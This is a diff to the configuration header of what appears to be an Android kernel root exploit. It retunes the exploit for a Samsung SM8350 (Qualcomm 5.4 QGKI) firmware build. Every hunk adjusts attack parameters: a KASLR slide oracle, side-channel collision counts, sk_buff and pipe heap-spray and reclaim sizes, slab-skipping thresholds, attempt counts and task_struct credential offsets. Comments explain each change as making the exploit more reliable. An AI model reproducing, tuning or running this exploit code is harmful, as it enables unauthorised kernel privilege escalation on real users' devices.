@@ -42,10 +42,10 @@
 #define KMALLOC_CACHE_TYPES 3
 
 #define MM_ORDER 3
-#define KSNITCH_COLLISIONS 4
+#define KSNITCH_COLLISIONS 5          /* 5.4 QGKI SM8350: needs one more collision than Exynos */
 #define KERNELSNITCH_VERBOSE 0
 #define KERNELSNITCH_MTE_ENABLED 0
-#define KERNELSNITCH_THRESHOLD_MULT 10
+#define KERNELSNITCH_THRESHOLD_MULT 6  /* Qualcomm scheduler is faster; lower multiplier needed */
 #define FAKE_WAITER_PRIO 130
 #define PSELECT_ENTER_DELAY_USEC 50000
 
@@ -60,7 +60,7 @@
 #define APP_EXACT_PIPE_BUFFER_ONLY 1
 #define APP_PRODUCTION_STACK_PI_RIGHT_ONLY 1
 #define APP_ROOT_REF_HOLDER_REQUIRED 0
-#define DEFAULT_EXPLOIT_ATTEMPTS 8
+#define DEFAULT_EXPLOIT_ATTEMPTS 24 /* match preload supervisor attempts */
 #else
 #define BUILD_VARIANT_LABEL "r9q2-G990B2XXSKIZH2-root-umh"
 #endif
@@ -83,9 +83,9 @@
 
 #define SKB_DATA_DELTA (-0xe80LL)
 #define SKB_SEND_SIZE 0x8e80
-#define SKB_RECLAIM_SENDS 64
-#define APP_SLIDE_RECLAIM_SENDS 64
-#define PIPE_MAX_ATTEMPTS 12
+#define SKB_RECLAIM_SENDS 128          /* SM8350: more reclaim sends for reliable sk_buff placement */
+#define APP_SLIDE_RECLAIM_SENDS 128
+#define PIPE_MAX_ATTEMPTS 20           /* increase to compensate for DMA32 skip failures */
 
 // KASLR slide oracle — 32 slots of 64KB, probe at Image[0x1f0000 - slide]
 #define SLIDE_FAKE_WAITER_PRIO 0
@@ -159,11 +159,11 @@
 #define S918_PAGE_SCAN_MAX 256
 #define S918_KSNITCH_HINT_COLLISIONS 2
 #define S918_KSNITCH_FULL_COLLISIONS 5
-#define S918_DMA32_SKIP_SLABS 8
-#define S918_TRIGGER_SLABS 24
-#define S918_SKB_SENDS 256
-#define S918_SKB_SNDBUF 8388608
-#define S918_RECLAIM_SOCKET_PAIRS 32
+#define S918_DMA32_SKIP_SLABS 4        /* SM8350: fewer DMA32 slabs to skip vs Exynos */
+#define S918_TRIGGER_SLABS 16          /* SM8350: lower trigger threshold */
+#define S918_SKB_SENDS 512             /* SM8350: needs more SKB sends for reliable page leak */
+#define S918_SKB_SNDBUF 16777216       /* 16 MB: larger send buffer for SM8350 */
+#define S918_RECLAIM_SOCKET_PAIRS 64   /* more socket pairs for better reclaim coverage */
 
 // task_struct credential offsets (5.4 QGKI arm64, same as 5.10 Qualcomm)
 #define TASK_STRUCT_CRED_OFF      0x798ULL
